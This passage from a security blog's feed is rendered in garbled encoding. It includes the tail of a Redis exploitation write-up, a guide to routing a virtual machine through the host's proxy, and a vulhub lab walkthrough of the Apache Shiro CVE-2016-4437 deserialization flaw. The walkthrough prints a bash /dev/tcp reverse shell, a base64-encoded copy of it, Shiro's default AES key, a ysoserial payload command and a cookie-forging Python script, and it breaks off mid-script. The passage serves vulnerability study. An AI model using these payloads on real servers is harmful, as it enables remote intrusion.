&gt;&amp; /dev/tcp/192.168.192.135/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113528895.png" alt="image-20250325113528895"></p><p>ä¹‹ååœ¨ç›‘å¬æœºä¸Šå°±èƒ½çœ‹åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113511333.png" alt="image-20250325113511333"></p><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113712853.png" alt="image-20250325113712853"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯é¶æœºçš„ipåœ°å€ã€‚</p><p>ä¸»åŠ¨å…³é—­è¿æ¥ç›´æ¥åœ¨æ”»å‡»æœºä¸Šexitã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§redisæ¼æ´åŸç†ï¼›ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´åŠredisæ¼æ´å¤ç°ï¼›åˆ©ç”¨rediså†™å…¥webshellï¼›pythonè„šæœ¬åˆ©ç”¨redisï¼›sshå…¬é’¥å…ç™»å½•åˆ©ç”¨redisï¼›msfåˆ©ç”¨redisï¼›åå¼¹shellåˆ©ç”¨redis</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vmè™šæ‹Ÿæœºå¦‚ä½•å®ç°ä¸ä¸»æœºå…±äº«ä»£ç†å®ç°ç§‘å­¦ä¸Šç½‘</title>
    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:04:32.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨tunæ¨¡å¼ï¼ˆæ¨èï¼‰">æ–¹æ³•ä¸€ï¼šä½¿ç”¨tunæ¨¡å¼ï¼ˆæ¨èï¼‰</h2><p>ç›¸å…³æ–‡ç« ï¼š<a href="https://clashvmess.com/3841.html">æ·±åº¦è§£æclashå¼€tunæ¨¡å¼ï¼šé…ç½®ä¸ä½¿ç”¨æŒ‡å— - Clashæœ€æ–°æ•™ç¨‹</a></p><p>å¦‚æœä¸»æœºæ˜¯ä½¿ç”¨ä»£ç†è½¯ä»¶èµ°ä»£ç†çš„è¯ï¼Œæ¯”å¦‚clashï¼Œ å¯ä»¥ç›´æ¥ä½¿ç”¨Tunæ¨¡å¼ã€‚Tunæ¨¡å¼ä¸‹ï¼Œä»£ç†è½¯ä»¶ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼Œä¸»æœºä¸Šçš„è¿›ç¨‹ï¼ˆåŒ…æ‹¬è™šæ‹Ÿæœºï¼‰çš„ç½‘ç»œè¯·æ±‚éƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªè™šæ‹Ÿç½‘å¡ã€‚è¿™ç§æ¨¡å¼æ‹¦æˆªäº†æ‰€æœ‰è¿›ç¨‹çš„ç½‘ç»œè¯·æ±‚ï¼Œæœ‰äº›è¿›ç¨‹å¹¶ä¸éµå®ˆç³»ç»Ÿä»£ç†ï¼Œæ¯”å¦‚ç»ˆç«¯, pip, dockerç­‰ç­‰ï¼ŒTunæ¨¡å¼ä¸“æ²»è¿™ç§ã€‚</p><h2 id="æ–¹æ³•äºŒï¼šä½¿ç”¨ç³»ç»Ÿä»£ç†æ¨¡å¼">æ–¹æ³•äºŒï¼šä½¿ç”¨ç³»ç»Ÿä»£ç†æ¨¡å¼</h2><p><strong>å¾ˆéº»çƒ¦ï¼Œæ¨èç¬¬ä¸€ç§</strong></p><p>VMè½¯ä»¶é…ç½®<br>1.VMè™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨<br>æ‰“å¼€è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼ˆæ–¹å¼ï¼šç¼–è¾‘-&gt;è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>ç„¶åç‚¹å‡»æ›´æ”¹è®¾ç½®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.é…ç½®VMnet8å’ŒVMnet1<br>VMnet8ã€å­ç½‘é…ç½®ã€‘å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>ã€NATè®¾ç½®ã€‘å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>ã€DHCPè®¾ç½®ã€‘å¦‚ä¸‹ï¼šï¼ˆå¯ä»¥ç†è§£ä¸ºè™šæ‹Ÿæœºçš„ipèŒƒå›´ï¼Œ ä¸è¦è·Ÿä¸Šå›¾é…ç½®çš„ç½‘å…³å†²çªäº†ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>ã€VMnet1ã€‘é‡‡ç”¨é»˜è®¤é…ç½®å°±å¯ä»¥äº†ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æŒ‰ç…§ä¸Šè¿°vmnet8çš„æ–¹å¼ä¿®æ”¹ä¸€ä¸ªå®¹æ˜“è®°ä½çš„ipï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>å››ã€ä¸»æœºIPé…ç½®<br>windowsè¿›å…¥æ‰“å¼€è®¾ç½®-&gt;ç½‘ç»œ</p><p>ã€2024-9-18è¡¥å……ã€‘ã€å¯é€‰START  // è¡¨ç¤ºè¿™ä¸ªè¿™ä¸ªèŒƒå›´æ˜¯å¯æœ‰å¯æ— çš„ã€‘</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>åŒå‡»ä¸Šè¿°çº¢æ¡†ï¼Œç„¶åé…ç½®å¦‚ä¸‹ï¼šï¼ˆè¿™é‡Œä¸è¦è·Ÿä¹‹å‰çš„ç½‘å…³å†²çªäº†ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>ã€2024-9-18è¡¥å……ã€‘ã€å¯é€‰END   // è¡¨ç¤ºè¿™ä¸ªèŒƒå›´æ˜¯å¯æœ‰å¯æ— çš„ã€‘</p><p>ä»£ç†è½¯ä»¶è¦å¼€å¯ã€Allow LANã€‘ï¼šï¼ˆè¿™é‡Œè¦è®°ä½ç«¯å£, æˆ‘çš„æ˜¯7890ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>ç„¶å‡»åç‚¹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>è®°ä½ä¸‹é¢çš„æ¥å£ip,è¿™ä¸ªipéœ€è¦åœ¨Vmè™šæ‹Ÿæœºä¸­ä½¿ç”¨ï¼Œ ä¸¤ä¸ªéƒ½å¯ä»¥ç”¨</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>åœ¨windowsç»ˆç«¯ä¸‹è¾“å…¥ipconfigåŒæ ·å¯ä»¥æŸ¥åˆ°ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>äº”ã€è™šæ‹Ÿæœºä»£ç†ipé…ç½®<br>åœ¨é…ç½®ä»£ç†ä¹‹å‰éœ€è¦è®¾ç½®ç½‘ç»œé€‚é…å™¨ï¼Œ æˆ‘ä»¬ä¹‹å‰é…ç½®äº†VMnet8ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 è™šæ‹Ÿæœºä¸Šç”¨ã€è®¾ç½®ã€‘é…ç½®ä»£ç†<br>ç”¨ã€è®¾ç½®ã€‘é…ç½®ä»£ç†ï¼Œä»£ç†è®¾ç½®ä¼šå½±å“æ‰€æœ‰å›¾å½¢appï¼Œ æ¯”å¦‚æµè§ˆå™¨ï¼Œshellâ€¦</p><p>ä½†æ˜¯å´å½±å“ä¸äº†ssh(ç”¨sshè¿æ¥è™šæ‹Ÿæœºubuntu)ç»ˆç«¯ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨sshè¿˜éœ€è¦é…ç½®ä»£ç†ï¼Œå‚è€ƒç¬¬ä¸ƒèŠ‚ã€‚</p><p>å½“ç„¶è¿™ç§é…ç½®ä¹Ÿå½±å“ä¸äº†å¾ˆå¤šéœ€è¦å•ç‹¬é…ç½®ä»£ç†çš„app, æ¯”å¦‚conda, pip, dockerç­‰ç­‰</p><p>è¿›å…¥è™šæ‹Ÿæœºï¼Œé…ç½®ip,å¦‚æœæ˜¯Ubuntuå¯ä»¥å‚è€ƒä¸‹é¢çš„é…ç½®ï¼š(æ³¨æ„ä¸‹å›¾çš„ç«¯å£ï¼Œè¦è·Ÿä»£ç†è½¯ä»¶çš„ç«¯å£ä¸€è‡´)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>ç„¶åå¯ä»¥æ‰“å¼€æµè§ˆå™¨çœ‹å¤–ç½‘ï¼Œæˆ–è€…ç»ˆç«¯ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§vmè™šæ‹Ÿæœºå¦‚ä½•å®ç°ä¸ä¸»æœºå…±äº«ä»£ç†å®ç°ç§‘å­¦ä¸Šç½‘;è½¯ä»¶ä»£ç†ä½¿ç”¨tunæ¨¡å¼;ç³»ç»Ÿä»£ç†è®¾ç½®æ–¹æ³•</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Shiroååºåˆ—åŒ–æ¼æ´å…¨è§£æåŠå„æ¼æ´å¤ç°ã€vulhubé¶åœºã€‘</title>
    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-30T12:59:13.965Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ä»‹ç»Apache-Shiro-1-2-4-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰">ä»‹ç»<strong>Apache Shiro 1.2.4</strong> ååºåˆ—åŒ–æ¼æ´ï¼ˆ<strong>CVE-2016-4437</strong>ï¼‰</h2><p>Apache Shiroæ˜¯â¼€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€</p><p>æ˜“â½¤ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„â½¤æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookie</p><p>ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿â½¤Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ â½¤æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›â½½åœ¨â½¬æ ‡æœº</p><p>å™¨ä¸Šæ‰§â¾ä»»æ„å‘½ä»¤ã€‚</p><h2 id="æ¼æ´æˆå› ">æ¼æ´æˆå› </h2><p>å…¶æ¼æ´çš„æ ¸â¼¼æˆå› æ˜¯cookieä¸­çš„èº«ä»½ä¿¡æ¯è¿›â¾äº†AESåŠ è§£å¯†ï¼Œâ½¤äºåŠ è§£å¯†çš„å¯†é’¥åº”è¯¥æ˜¯ç»å¯¹ä¿å¯†</p><p>çš„ï¼Œä½†åœ¨shiroç‰ˆæœ¬&lt;=1.2.24çš„ç‰ˆæœ¬ä¸­ä½¿â½¤äº†å›ºå®šçš„å¯†é’¥ã€‚å› æ­¤ï¼ŒéªŒè¯æ¼æ´çš„æ ¸â¼¼åº”è¯¥è¿˜æ˜¯åœ¨äºæˆ‘</p><p>ä»¬ï¼ˆæ”»å‡»è€…ï¼‰å¯å¦è·å¾—è¿™ä¸ªAESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœç¡®å®æ˜¯å›ºå®šçš„å¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>æˆ–è€…å…¶ä»–æˆ‘ä»¬å¯ä»¥é€šè¿‡è„šæœ¬â¼¯å…·çˆ†ç ´å‡ºæ¥çš„å¯†é’¥ï¼Œé‚£ä¹ˆshiro550æ¼</p><p>æ´æ‰â¼€å®šå­˜åœ¨ã€‚</p><h2 id="Shiroç‰¹å¾"><strong>Shiro</strong>ç‰¹å¾</h2><p>â¾¸å…ˆåº”è¯¥åˆ¤æ–­â¼€ä¸ªâ»šâ¾¯çš„ç™»å½•æ˜¯å¦ä½¿â½¤äº†shiroæ¡†æ¶è¿›â¾èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚åˆ¤æ–­</p><p>â½…æ³•åœ¨äºï¼šå‹¾é€‰è®°ä½å¯†ç é€‰é¡¹åï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…ï¼Œè§‚å¯Ÿè¯·æ±‚åŒ…ä¸­æ˜¯å¦æœ‰remembermeå­—æ®µï¼Œå“</p><p>åº”åŒ…ä¸­æ˜¯å¦æœ‰Set-cookie:rememberMe=deleteMeå­—æ®µã€‚ç±»ä¼¼äºä¸‹å›¾è¿™æ ·ï¼š</p><blockquote><p>\1. æœªç™»å½•çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚åŒ…çš„cookieä¸­æ²¡æœ‰rememberMeå­—æ®µï¼Œè¿”å›åŒ…set-Cookieâ¾¥ä¹Ÿæ²¡æœ‰</p><p>deleteMeå­—æ®µ</p><p>\2. ç™»å½•å¤±è´¥çš„è¯ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å‹¾é€‰RememberMeå­—æ®µï¼Œè¿”å›åŒ…éƒ½ä¼šæœ‰ rememberMe= deleteMe</p><p>å­—æ®µ</p><p>\3. ä¸å‹¾é€‰RememberMeï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieâ¾¥æœ‰rememberMe=deleteMeå­—</p><p>æ®µã€‚ä½†æ˜¯ä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¸ä¼šæœ‰RememberMeå­—æ®µ</p><p>\4. å‹¾é€‰RememberMeï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ…set-Cookieâ¾¥æœ‰rememberMe=deleteMeå­—æ®µï¼Œ</p><p>è¿˜ä¼šæœ‰remember å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­Cookieéƒ½ä¼šæœ‰rememberMeå­—æ®µ</p><p>\5. æˆ–è€…å¯ä»¥åœ¨cookieåâ¾¯â¾ƒâ¼°åŠ â¼€ä¸ªrememberMe=1ï¼Œçœ‹è¿”å›åŒ…æœ‰æ²¡æœ‰rememberMe=</p><p>deleteMe</p></blockquote><h2 id="æ¼æ´ç¯å¢ƒåŠå¤ç°">æ¼æ´ç¯å¢ƒåŠå¤ç°</h2><h3 id="CVE-2016-4437ï¼ˆshiro550ååºåˆ—åŒ–æ¼æ´ï¼‰">CVE-2016-4437ï¼ˆshiro550ååºåˆ—åŒ–æ¼æ´ï¼‰</h3><p>é¶æœºå¼€å¯ç¯å¢ƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½é¡¹â½¬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># è¿›â¼ŠæŸâ¼€ä¸ªæ¼æ´/ç¯å¢ƒçš„â½¬å½•</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨ç¯å¢ƒ</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#å¯åŠ¨å®¹å™¨</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><p>æ”»å‡»æœºè®¿é—®é¶æœºip:8080ç«¯å£ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å°±è¯´æ˜æ­å»ºæˆåŠŸ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330170402576.png" alt="image-20250330170402576"></p><p>è¿›è¡Œæ¼æ´å¤ç°ä¹‹å‰ï¼Œåº”è¯¥å…ˆéªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚é‚£ä¹ˆé¦–å…ˆåº”è¯¥åˆ¤æ–­ä¸€ä¸ªé¡µé¢çš„ç™»å½•æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶è¿›è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚åˆ¤æ–­æ–¹æ³•åœ¨äºï¼šå‹¾é€‰è®°ä½å¯†ç é€‰é¡¹åï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…ï¼Œè§‚å¯Ÿè¯·æ±‚åŒ…ä¸­æ˜¯å¦æœ‰remembermeå­—æ®µï¼Œå“åº”åŒ…ä¸­æ˜¯å¦æœ‰Set-cookie:rememberMe=deleteMeå­—æ®µã€‚ç±»ä¼¼äºä¸‹å›¾è¿™æ ·ï¼š<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330170750820.png" alt="image-20250330170750820"></p><p><strong>å¦‚æœå‡ºç°rememberMe=deleteMeå­—æ®µæ˜¯ä»…ä»…èƒ½è¯´æ˜ç™»å½•é¡µé¢é‡‡ç”¨äº†shiroè¿›è¡Œäº†èº«ä»½éªŒè¯è€Œå·²ï¼Œå¹¶éç›´æ¥å°±è¯´æ˜å­˜åœ¨æ¼æ´</strong>ã€‚å…¶æ¼æ´éªŒè¯æµç¨‹ç±»ä¼¼åˆ¤æ–­è¯·æ±‚å’Œå“åº”åŒ…çš„å­—æ®µï¼Œåº”è¯¥éªŒè¯ä¸Šè¿°çš„shiroç‰¹å¾ã€‚</p><h4 id="æ„é€ cookieè·å–åå¼¹shell">æ„é€ cookieè·å–åå¼¹shell</h4><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.133</p></blockquote><h5 id="step1-å¼€å¯ç«¯å£ç›‘å¬">step1:å¼€å¯ç«¯å£ç›‘å¬</h5><p>é¦–å…ˆæˆ‘ä»¬åœ¨æ”»å‡»æœºå¼€å¯ä¸€ä¸ªç«¯å£ï¼Œç”¨äºæ¥æ”¶åå¼¹shellï¼Œæˆ‘è¿™é‡Œå¼€å¯6666ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc â€“lvp 6666</span><br></pre></td></tr></table></figure><h5 id="step2-æ”»å‡»æœºæ­å»ºVPSæœåŠ¡ï¼Œå­˜æ”¾åå¼¹shellçš„payload1">step2:æ”»å‡»æœºæ­å»ºVPSæœåŠ¡ï¼Œå­˜æ”¾åå¼¹shellçš„payload1</h5><p>åå¼¹shellçš„å‘½ä»¤å¦‚ä¸‹ï¼ˆåˆ«å¿˜äº†æŠŠipæ”¹ä¸ºæ”»å‡»æœºçš„ipï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.133/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>å½“å‘½ä»¤ä¸­åŒ…å«é‡å®šå‘ â€™ &lt; â€™ â€™ &gt; â€™ å’Œç®¡é“ç¬¦ â€™ | â€™ æ—¶ï¼Œéœ€è¦è¿›è¡Œ base64 ç¼–ç ç»•è¿‡æ£€æµ‹ã€‚å¯ä»¥ä½¿ç”¨åœ¨çº¿ç½‘ç«™å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œç½‘å€ä¸ºï¼š<a href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresXâ€™s Blog</a></p><p>å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å¯¹åå¼¹shellçš„å‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330173541925.png" alt="image-20250330173541925"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzMvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨åºåˆ—åŒ–å·¥å…·ysoserial.jarï¼ˆå·¥å…·ä¸‹è½½æˆ‘ä¼šåœ¨æ–‡æœ«ç»™å‡ºï¼‰ç”Ÿæˆpayloadï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzMvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>è¿™æ®µå‘½ä»¤ä¸­â€œâ€ä¸­çš„éƒ¨åˆ†æ˜¯åˆšæ‰ç”Ÿæˆçš„åå¼¹shellçš„base64ç¼–ç ã€‚</p><p><strong>ç”±äºæœªçŸ¥åŸå› ï¼Œè¿™ä¸€éƒ¨æˆ‘å¤ç°æ€»æ˜¯æŠ¥é”™ï¼Œæ‰¾åŸå› ä¹Ÿæ²¡æ‰¾åˆ°ï¼Œæ‰€ä»¥æœªå¤ç°æˆåŠŸï¼Œä»¥ä¸‹æ˜¯çœ‹çš„åˆ«äººçš„å¤ç°è¿‡ç¨‹ï¼ˆ<a href="https://blog.csdn.net/Bossfrank/article/details/130173880">shiro550ååºåˆ—åŒ–æ¼æ´åŸç†ä¸æ¼æ´å¤ç°ï¼ˆåŸºäºvulhubï¼Œä¿å§†çº§çš„è¯¦ç»†æ•™ç¨‹ï¼‰_shiro550åŸç†-CSDNåšå®¢</a>ï¼‰ï¼š</strong></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6032bb976fc6041b40f5d8c31416571e.png" alt="img"></p><p>å¯¹è¿™æ®µå‘½ä»¤åšä¸ªç®€è¦çš„è§£é‡Šï¼šè¿™é‡Œæˆ‘ä»¬ç›¸å½“äºåœ¨æ”»å‡»æœºä¸Šå¯åŠ¨äº†ä¸€ä¸ªVPSæœåŠ¡ï¼Œç›‘å¬6666ç«¯å£ï¼Œç„¶ååœ¨è¿™ä¸ªæœåŠ¡ä¸Šæ”¾äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå¹¶ç”¨åºåˆ—åŒ–å·¥å…·ysoserialæŒ‡å®š CommonsCollections5 åˆ©ç”¨é“¾ç”Ÿæˆå¯æ‰§è¡Œbash -i &gt;&amp; /dev/tcp/192.168.192.133/6666 0&gt;&amp;1å‘½ä»¤çš„åºåˆ—åŒ–æ•°æ®payload1ã€‚å½“åé¢æœ‰å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡æ—¶ï¼Œæˆ‘ä»¬æ­å»ºçš„è¿™ä¸ªJRMPå°±ä¼šè¿”å›è¿™æ®µpayload1ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆæ˜¯CommonsCollections5 ï¼Œè¿™æ˜¯å› ä¸ºé¶åœºçš„ shiro å­˜åœ¨ commons-collections 3.2.1 ä¾èµ–ï¼Œ æ˜¯ä¸€ä¸ªç‰ˆæœ¬é—®é¢˜ã€‚</p><h5 id="step3-ç”ŸæˆAESåŠ å¯†-Base64ç¼–ç åçš„rememberMeå­—æ®µ">step3:ç”ŸæˆAESåŠ å¯†=&gt;Base64ç¼–ç åçš„rememberMeå­—æ®µ</h5><p>æˆ‘ä»¬ä¼å›¾è®©å­˜åœ¨æ¼æ´çš„é¡µé¢å»è¯·æ±‚æˆ‘ä»¬æ”»å‡»æœºçš„VPSæœåŠ¡ï¼Œå³å¯¹192.168.192.133:7777è¿›è¡Œè¯·æ±‚ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¦ç”¨è„šæœ¬å¯¹192.168.192.133:7777è¿›è¡ŒAESåŠ å¯†=&gt;Base64ç¼–ç ã€‚</p><p>è„šæœ¬shiro.pyä»£ç å¦‚ä¸‹ï¼ˆæ³¨æ„è¿™æ˜¯ä¸€æ®µpython2çš„ä»£ç ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme(sys.argv[1])   </span><br><span class="line">print 